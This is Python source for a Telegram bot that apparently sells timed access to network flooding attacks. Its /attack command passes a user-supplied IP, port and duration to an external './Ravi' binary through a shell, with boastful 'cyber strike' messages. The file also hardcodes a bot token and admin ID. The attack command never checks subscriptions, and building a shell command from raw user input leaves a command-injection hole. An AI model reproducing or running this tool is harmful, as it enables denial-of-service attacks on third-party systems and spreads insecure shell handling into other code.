import telebot
import time
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# Bot Token
TOKEN = "7781064101:AAGwS43iWHqTobGvJXOQqTKYtbUxN6hh_JI"
bot = telebot.TeleBot(TOKEN)

# Admin User ID (Replace with your Telegram ID)
ADMIN_ID = 8179218740  # Replace with your actual Telegram ID

# Dictionary to store users and expiry time
users = {}

# Start Command
@bot.message_handler(commands=['start'])
def start(message):
    user = message.from_user
    user_id = user.id
    username = user.first_name if user.first_name else "User"

    # Check if user is active
    current_time = time.time()
    status = "✅ ACTIVE" if user_id in users and users[user_id] > current_time else "❌ NOT ACTIVE"

    # Get user's profile photo
    photos = bot.get_user_profile_photos(user_id)

    # Create buttons
    keyboard = InlineKeyboardMarkup()
    join_button = InlineKeyboardButton("🔗 CLICK HERE TO JOIN", url="https://t.me/MUSTAFALEAKS2")
    creator_button = InlineKeyboardButton("👑 BOT CREATED BY 👑", url="https://t.me/SIDIKI_MUSTAFA_47")
    keyboard.add(join_button, creator_button)

    caption = f"""
👋 WELCOME, ------{username} ☠️🔥
--------------------------------------------------------
🤖 THIS IS MUSTAFA BOT!
🆔 User ID: {user_id}
🛡 STATUS: {status}

📢 Join Our Official Channel:

📌 Try This Command:
/FLASH - 🚀 Start an attack!

👑 BOT CREATED BY: @SIDIKI_MUSTAFA_47 ☠️
"""

    if photos.total_count > 0:
        bot.send_photo(message.chat.id, photos.photos[0][0].file_id, caption=caption, reply_markup=keyboard)
    else:
        bot.send_message(message.chat.id, caption, reply_markup=keyboard)

# Help Command
@bot.message_handler(commands=['help'])
def help(message):
    help_text = """
🛠 Available Commands:

▶️ /start - Start the bot and check your status  
🚀 /attack IP PORT TIME - Start an attack  
➕ /add USER_ID TIME - Add user for limited time (Admin only)  
➖ /remove USER_ID - Remove a user (Admin only)  
👥 /users - List active users (Admin only)  
ℹ️ /help - Show this help message  
    """
    bot.reply_to(message, help_text)

# Attack Command


import subprocess

# Attack Command
@bot.message_handler(commands=['attack'])
def attack(message):
    args = message.text.split()
    if len(args) != 4:
        bot.reply_to(message, "⚠️ Example Usage:\n`/attack IP PORT TIME`", parse_mode="Markdown")
        return
    
    ip, port, attack_time = args[1], args[2], args[3]

    # Aesthetic Start Message
    start_msg = f"""
🔥🚀 **UNSTOPPABLE CYBER STRIKE INITIATED!** 🚀🔥
━━━━━━━━━━━━━━━━━━━━━━━
🎯 **Target:** `{ip}:{port}`  
⏳ **Duration:** `{attack_time} seconds`  
⚡ **Status:** ARMING THE WAR MACHINE...  
━━━━━━━━━━━━━━━━━━━━━━━
💀 **HOLD ON! THE STORM BEGINS NOW!** 💀
"""

    bot.send_message(message.chat.id, start_msg, parse_mode="Markdown")

    # Execute the attack command
    command = f"./Ravi {ip} {port} {attack_time} 1000"
    subprocess.run(command, shell=True)

    time.sleep(int(attack_time))

    # Aesthetic Stop Message
    stop_msg = f"""
✅ **MISSION ACCOMPLISHED!** 💥  
━━━━━━━━━━━━━━━━━━━━━━━
🎯 **Target:** `{ip}:{port}`  
🔥 **STATUS:** ATTACK EXECUTED SUCCESSFULLY!  
💣 **WAR MACHINE POWERING DOWN...**  
━━━━━━━━━━━━━━━━━━━━━━━
🚀 **DESTRUCTION LEVEL: 100%** 🚀
"""

    bot.send_message(message.chat.id, stop_msg, parse_mode="Markdown")

    ip, port, attack_time = args[1], args[2], args[3]
    bot.send_message(message.chat.id, f"🚀 Attack Started!\n📍 Target: `{ip}:{port}`\n⏳ Duration: `{attack_time}s`", parse_mode="Markdown")
    
    time.sleep(int(attack_time))
    bot.send_message(message.chat.id, "✅ Attack Stopped!")

# Add User Command (Admin Only)
@bot.message_handler(commands=['add'])
def add_user(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ You are not authorized to use this command!")
        return
    
    args = message.text.split()
    if len(args) != 3:
        bot.reply_to(message, "⚠️ Example Usage:\n`/add USER_ID TIME`\n(Time format: seconds, minutes, hours, days, weeks, months)", parse_mode="Markdown")
        return
    
    user_id = int(args[1])
    duration = args[2]
    
    # Convert time format
    if duration.endswith("s"):
        expire_time = time.time() + int(duration[:-1])
    elif duration.endswith("m"):
        expire_time = time.time() + int(duration[:-1]) * 60
    elif duration.endswith("h"):
        expire_time = time.time() + int(duration[:-1]) * 3600
    elif duration.endswith("d"):
        expire_time = time.time() + int(duration[:-1]) * 86400
    elif duration.endswith("w"):
        expire_time = time.time() + int(duration[:-1]) * 604800
    elif duration.endswith("mo"):
        expire_time = time.time() + int(duration[:-2]) * 2592000
    else:
        bot.reply_to(message, "⚠️ Invalid time format! Use s (seconds), m (minutes), h (hours), d (days), w (weeks), mo (months).")
        return
    
    users[user_id] = expire_time
    bot.reply_to(message, f"✅ User `{user_id}` added for `{duration}`.", parse_mode="Markdown")

# Remove User Command (Admin Only)
@bot.message_handler(commands=['remove'])
def remove_user(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ You are not authorized to use this command!")
        return
    
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "⚠️ Example Usage:\n`/remove USER_ID`", parse_mode="Markdown")
        return
    
    user_id = int(args[1])
    
    if user_id in users:
        del users[user_id]
        bot.reply_to(message, f"✅ User `{user_id}` removed.", parse_mode="Markdown")
    else:
        bot.reply_to(message, "⚠️ User not found!")

# List Users Command (Admin Only)
@bot.message_handler(commands=['users'])
def list_users(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ You are not authorized to use this command!")
        return
    
    if not users:
        bot.reply_to(message, "⚠️ No active users!")
        return

    response = "👥 **Active Users:**\n"
    current_time = time.time()
    for user_id, expiry in users.items():
        remaining_time = int(expiry - current_time)
        response += f"🆔 `{user_id}` - Expires in `{remaining_time}s`\n"
    
    bot.reply_to(message, response, parse_mode="Markdown")

# Run Bot
bot.polling(none_stop=True)
